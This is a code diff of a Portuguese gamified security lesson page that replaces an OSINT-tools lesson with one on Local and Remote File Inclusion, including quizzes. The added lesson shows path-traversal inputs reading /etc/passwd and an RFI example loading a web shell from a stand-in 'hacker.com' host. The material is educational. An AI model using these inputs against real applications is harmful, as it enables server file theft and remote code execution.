@@ -9,14 +9,14 @@
     <link rel="dns-prefetch" href="https://fonts.googleapis.com">
     <link rel="dns-prefetch" href="https://fonts.gstatic.com">
     <link rel="dns-prefetch" href="https://cdnjs.cloudflare.com">
-    <title>CyberDuo - Ferramentas OSINT 3.1b</title>
+    <title>CyberDuo - Inclusão de Arquivos (LFI e RFI)</title>
     <link rel="icon" type="image/svg+xml" href="../assets/favicon.svg">
     <link rel="stylesheet" href="../assets/tailwind.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Inter:wght@300;400;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
-            --cyber-blue: #00facd;
+            --cyber-blue: #00f2ff;
             --cyber-green: #00ff41;
             --cyber-red: #ff003c;
             --cyber-yellow: #ffb800;
@@ -95,8 +95,8 @@
         .game-footer { flex-shrink: 0; padding: 1rem 1rem max(1rem, env(safe-area-inset-bottom)); background: #0d1117; border-top: 1px solid #1f2937; width: 100%; display: flex; justify-content: center; box-sizing: border-box; z-index: 50; }
         .check-btn { width: 100%; max-width: 400px; padding: 1rem; border-radius: 1rem; font-weight: 800; text-transform: uppercase; cursor: pointer; background: #1f2937; color: #4b5563; border: none; font-size: 1rem; letter-spacing: 1px; transition: all 0.1s; -webkit-tap-highlight-color: transparent; }
         .check-btn:active { transform: scale(0.98); }
-        .check-btn.active { background: var(--cyber-blue); color: black; box-shadow: 0 4px 0 #009e80; }
-        .check-btn.active:active { transform: translateY(4px); box-shadow: 0 0px 0 #009e80; }
+        .check-btn.active { background: var(--cyber-blue); color: black; box-shadow: 0 4px 0 #00a8b3; }
+        .check-btn.active:active { transform: translateY(4px); box-shadow: 0 0px 0 #00a8b3; }
 
         /* FEEDBACK OVERLAY */
         .feedback-overlay { position: fixed; bottom: -100%; left: 0; right: 0; padding: 1.5rem 1.5rem max(1.5rem, env(safe-area-inset-bottom)); transition: bottom 0.3s cubic-bezier(0.18, 0.89, 0.32, 1.28); z-index: 100; border-top-left-radius: 1.5rem; border-top-right-radius: 1.5rem; display: flex; flex-direction: column; align-items: center; text-align: left; }
@@ -110,7 +110,7 @@
 <body>
 
     <div class="game-header">
-        <div class="flex items-center justify-center cursor-pointer text-gray-500" style="min-width: 44px; min-height: 44px; margin-left: -10px;" onclick="window.location.href='../modules/modulo-03.html'"><i class="fas fa-times"></i></div>
+        <div class="flex items-center justify-center cursor-pointer text-gray-500" style="min-width: 44px; min-height: 44px; margin-left: -10px;" onclick="window.location.href='../modules/modulo-06.html'"><i class="fas fa-times"></i></div>
         <div class="progress-container"><div class="progress-fill" id="progressFill"></div></div>
         <div class="hearts" id="heartsContainer"></div>
     </div>
@@ -131,109 +131,87 @@
         const steps = [
             {
                         "type": "teach",
-                        "icon": "fa-toolbox",
-                        "title": "Recon-ng",
-                        "content": "<b>Recon-ng</b> é um framework OSINT modular (similar ao Metasploit). Possui módulos para <b>WHOIS</b>, <b>DNS</b>, <b>harvesting de e-mails</b>, <b>busca de subdomínios</b> e <b>geolocalização</b>.",
-                        "highlight": "Recon-ng = Metasploit do OSINT"
-            },
-            {
-                        "type": "teach",
-                        "icon": "fa-envelope",
-                        "title": "theHarvester",
-                        "content": "<b>theHarvester</b> coleta <b>e-mails</b>, <b>nomes</b>, <b>subdomínios</b>, <b>IPs</b> e <b>URLs</b> de fontes públicas (Google, Bing, LinkedIn, Shodan, Hunter.io).",
-                        "highlight": "theHarvester = coleta massiva de intel"
-            },
-            {
-                        "type": "teach",
-                        "icon": "fa-globe",
-                        "title": "Enumeração de DNS com DNSRecon",
-                        "content": "A ferramenta <b>dnsrecon</b> permite fazer enumeração ativa e passiva de registros DNS, incluindo transferências de zona (zone transfers), subdomínios via brute-force e resolução de registros SRV/TXT.",
-                        "highlight": "DNSRecon mapeia toda a infraestrutura DNS de um domínio."
+                        "icon": "fa-folder-open",
+                        "title": "Local File Inclusion (LFI)",
+                        "content": "<b>LFI</b> ocorre quando o desenvolvedor cria uma funcionalidade de carregar arquivos, mas não filtra o que o usuário está mandando a aplicação ler."
             },
             {
                         "type": "example",
-                        "icon": "fa-terminal",
-                        "title": "theHarvester em Ação",
-                        "scenario": "Coletando e-mails e subdomínios do domínio alvo usando múltiplas fontes.",
-                        "code": "theHarvester -d alvo.com -b google,bing,linkedin -l 500",
-                        "takeaway": "Combine múltiplas fontes para máxima cobertura."
-            },
-            {
-                        "type": "teach",
-                        "icon": "fa-file-lines",
-                        "title": "Metadata Analysis",
-                        "content": "Documentos (PDF, DOCX, XLSX) contêm <b>metadados</b>: autor, software, datas, caminhos de rede internos. <b>Exiftool</b> e <b>FOCA</b> extraem essas informações.",
-                        "highlight": "Metadados revelam infraestrutura interna"
-            },
-            {
-                        "type": "example",
-                        "icon": "fa-terminal",
-                        "title": "Exiftool para Metadados",
-                        "scenario": "Extraindo metadados de um PDF público encontrado no site do alvo.",
-                        "code": "exiftool documento.pdf\n# Revela: Author, Creator (software), Create Date, internal paths",
-                        "takeaway": "Metadados podem revelar usernames, software e caminhos internos."
-            },
-            {
-                        "type": "teach",
-                        "icon": "fa-database",
-                        "title": "Shodan e Censys",
-                        "content": "<b>Shodan</b>: indexa servidores, câmeras, IoT. <b>Censys</b>: foca em certificados e serviços TLS. Ambos permitem buscar dispositivos do alvo sem enviar pacotes.",
-                        "highlight": "Buscar dispositivos sem tocar no alvo"
-            },
-            {
-                        "type": "teach",
-                        "icon": "fa-users",
-                        "title": "LinkedIn e Redes Sociais",
-                        "content": "<b>LinkedIn</b>: vagas revelam tecnologias, perfis revelam hierarquia. <b>Hunter.io</b>: encontra padrões de e-mail. <b>Maltego</b>: visualiza relações entre entidades.",
-                        "highlight": "Pessoas revelam mais do que imaginam"
-            },
-            {
-                        "type": "match",
-                        "title": "Ferramenta OSINT → Função",
-                        "pairs": [
-                                    {
-                                                "term": "Recon-ng",
-                                                "definition": "Framework modular de OSINT"
-                                    },
-                                    {
-                                                "term": "theHarvester",
-                                                "definition": "E-mails e subdomínios"
-                                    },
-                                    {
-                                                "term": "Exiftool",
-                                                "definition": "Metadados de documentos"
-                                    },
-                                    {
-                                                "term": "FOCA",
-                                                "definition": "Metadados + fingerprinting"
-                                    },
-                                    {
-                                                "term": "Maltego",
-                                                "definition": "Visualização de relações"
-                                    }
-                        ]
-            },
-            {
-                        "type": "quiz",
-                        "task": "Qual ferramenta extrai metadados (autor, software, paths) de documentos como PDF e DOCX?",
-                        "options": [
-                                    "Exiftool",
-                                    "Nmap",
-                                    "SQLMap"
-                        ],
-                        "correctText": "Exiftool",
-                        "explanation": "Exiftool lê/escreve metadados em 300+ formatos de arquivo."
+                        "icon": "fa-book",
+                        "title": "A Injeção",
+                        "scenario": "A URL é `site.com?arquivo=foto.png`. O atacante troca para `site.com?arquivo=/etc/passwd`. A página carrega, em vez da foto, a lista de usuários internos do servidor Linux.",
+                        "takeaway": "LFI expõe o próprio coração do servidor."
             },
             {
                         "type": "fill",
-                        "sentence": "O framework OSINT modular que funciona de forma similar ao Metasploit é o ___.",
+                        "sentence": "Ao usar um LFI para vazar informações em um sistema Linux, o arquivo principal alvo do hacker é o /etc/___.",
                         "options": [
-                                    "Recon-ng",
-                                    "Shodan",
-                                    "theHarvester"
+                                    "passwd",
+                                    "shadow",
+                                    "hosts"
                         ],
-                        "correctText": "Recon-ng",
-                        "explanation": "Recon-ng tem módulos carregáveis, workspaces e banco de dados, similar ao Metasploit."
+                        "correctText": "passwd",
+                        "explanation": "O arquivo passwd é legível por todos no Linux e contém a lista do sistema."
+            },
+            {
+                        "type": "teach",
+                        "icon": "fa-arrow-up",
+                        "title": "Directory Traversal",
+                        "content": "O <b>Path Traversal</b> é a principal técnica para alcançar o LFI. Usando `../` o atacante sobe na hierarquia de pastas até sair da pasta web e cair na raiz do sistema operativo."
+            },
+            {
+                        "type": "example",
+                        "icon": "fa-stairs",
+                        "title": "Subindo Níveis",
+                        "scenario": "Se o site está em `/var/www/html/`, enviar `../../../../etc/passwd` faz o servidor subir as pastas até a raiz (`/`) e depois descer para ler as senhas.",
+                        "takeaway": "O `../` é a espinha dorsal de um ataque LFI."
+            },
+            {
+                        "type": "quiz",
+                        "task": "O que a sequência de caracteres `../` faz em um ataque de LFI/Directory Traversal?",
+                        "options": [
+                                    "Força a aplicação a subir um nível de diretório, permitindo escapar da pasta do servidor web.",
+                                    "Apaga arquivos do servidor web.",
+                                    "Cria um novo usuário invisível no banco de dados."
+                        ],
+                        "correctText": "Força a aplicação a subir um nível de diretório, permitindo escapar da pasta do servidor web.",
+                        "explanation": "Cada `../` sobe um degrau na escada do servidor."
+            },
+            {
+                        "type": "teach",
+                        "icon": "fa-network-wired",
+                        "title": "Remote File Inclusion (RFI)",
+                        "content": "<b>RFI</b> permite que um atacante faça a aplicação web baixar e executar um script malicioso hospedado em um servidor externo (controlado pelo atacante). Isso frequentemente leva a um RCE (Remote Code Execution), controle total do servidor.",
+                        "highlight": "RFI leva a RCE quase imediatamente."
+            },
+            {
+                        "type": "example",
+                        "icon": "fa-terminal",
+                        "title": "Injeção de Web Shell",
+                        "scenario": "A aplicação usa `include($_GET['page'])`. O atacante envia `?page=http://hacker.com/shell.txt`. O PHP baixa o `shell.txt` e o executa localmente no servidor da vítima.",
+                        "takeaway": "O servidor confia cegamente em URLs externas."
+            },
+            {
+                        "type": "quiz",
+                        "task": "Qual é a principal diferença entre LFI e RFI?",
+                        "options": [
+                                    "LFI lê arquivos locais; RFI executa scripts de servidores remotos.",
+                                    "LFI é mais perigoso que RFI.",
+                                    "RFI só afeta bancos de dados."
+                        ],
+                        "correctText": "LFI lê arquivos locais; RFI executa scripts de servidores remotos.",
+                        "explanation": "Remote = o payload vem de fora da infraestrutura."
+            },
+            {
+                        "type": "fill",
+                        "sentence": "A execução de código arbitrário resultante de um RFI é conhecida pela sigla ___ (Remote Code Execution).",
+                        "options": [
+                                    "RCE",
+                                    "XSS",
+                                    "SQLi"
+                        ],
+                        "correctText": "RCE",
+                        "explanation": "RCE é o nível máximo de comprometimento de um servidor."
             }
 ];
 
@@ -515,15 +493,15 @@
             document.getElementById('progressFill').style.width = `100%`;
             document.getElementById('footerArea').classList.add('hidden');
             
-            let nextBtnHtml = `<button class="check-btn active w-full" onclick="window.location.href='../lessons/10.1a-fundamentos-script.html'" style="background: var(--cyber-green); color: black; border-color: var(--cyber-green); box-shadow: 0 4px 0 #008f20; font-size: 1.1rem; padding: 1.2rem; letter-spacing: 2px;">PRÓXIMA LIÇÃO <i class="fas fa-arrow-right ml-2"></i></button>`;
+            let nextBtnHtml = `<button class="check-btn active w-full" onclick="window.location.href='../lessons/6.12-codigo-inseguro.html'" style="background: var(--cyber-green); color: black; border-color: var(--cyber-green); box-shadow: 0 4px 0 #008f20; font-size: 1.1rem; padding: 1.2rem; letter-spacing: 2px;">PRÓXIMA LIÇÃO <i class="fas fa-arrow-right ml-2"></i></button>`;
             if (nextBtnHtml.includes("##NEXT_LESSON_BTN" + "##")) {
-                nextBtnHtml = `<button class="check-btn active w-full" onclick="window.location.href='../lessons/1.0-introducao.html'" style="background: var(--cyber-green); color: black; border-color: var(--cyber-green); box-shadow: 0 4px 0 #009e80; font-size: 1.1rem; padding: 1.2rem; letter-spacing: 2px;">PRÓXIMA LIÇÃO <i class="fas fa-arrow-right ml-2"></i></button>`;
+                nextBtnHtml = `<button class="check-btn active w-full" onclick="window.location.href='../lessons/1.0-introducao.html'" style="background: var(--cyber-green); color: black; border-color: var(--cyber-green); box-shadow: 0 4px 0 #00a8b3; font-size: 1.1rem; padding: 1.2rem; letter-spacing: 2px;">PRÓXIMA LIÇÃO <i class="fas fa-arrow-right ml-2"></i></button>`;
             }
 
             document.getElementById('gameArea').innerHTML = `
                 <div class="game-card teach-card" style="align-items: center; text-align: center; border-color: var(--cyber-blue)">
                     <i class="fas fa-medal text-6xl text-yellow-400 mb-4 mt-4"></i>
-                    <h2 class="title-main mb-2">TOOLKIT OSINT DOMINADO!</h2>
+                    <h2 class="title-main mb-2">Você concluiu esta lição e dominou os conceitos apresentados.</h2>
                     <p class="text-body mb-6">Você completou esta lição com sucesso!</p>
                     <div style="display: flex; flex-direction: column; gap: 1rem; width: 100%; align-items: center; margin-top: 1rem;">
                         ${nextBtnHtml}
@@ -532,7 +510,7 @@
                                 <i class="fas fa-rotate-right mb-1 block text-lg"></i>
                                 <span style="font-size: 0.75rem; display: block; margin-top: 4px;">REINICIAR</span>
                             </button>
-                            <button class="check-btn" onclick="window.location.href='../modules/modulo-03.html'" style="flex: 1; background: #161b22; border: 2px solid var(--cyber-blue); color: var(--cyber-blue); box-shadow: 0 4px 0 rgba(0,255,255,0.2); padding: 0.8rem 0.5rem;">
+                            <button class="check-btn" onclick="window.location.href='../modules/modulo-06.html'" style="flex: 1; background: #161b22; border: 2px solid var(--cyber-blue); color: var(--cyber-blue); box-shadow: 0 4px 0 rgba(0,255,255,0.2); padding: 0.8rem 0.5rem;">
                                 <i class="fas fa-layer-group mb-1 block text-lg"></i>
                                 <span style="font-size: 0.75rem; display: block; margin-top: 4px;">MÓDULOS</span>
                             </button>
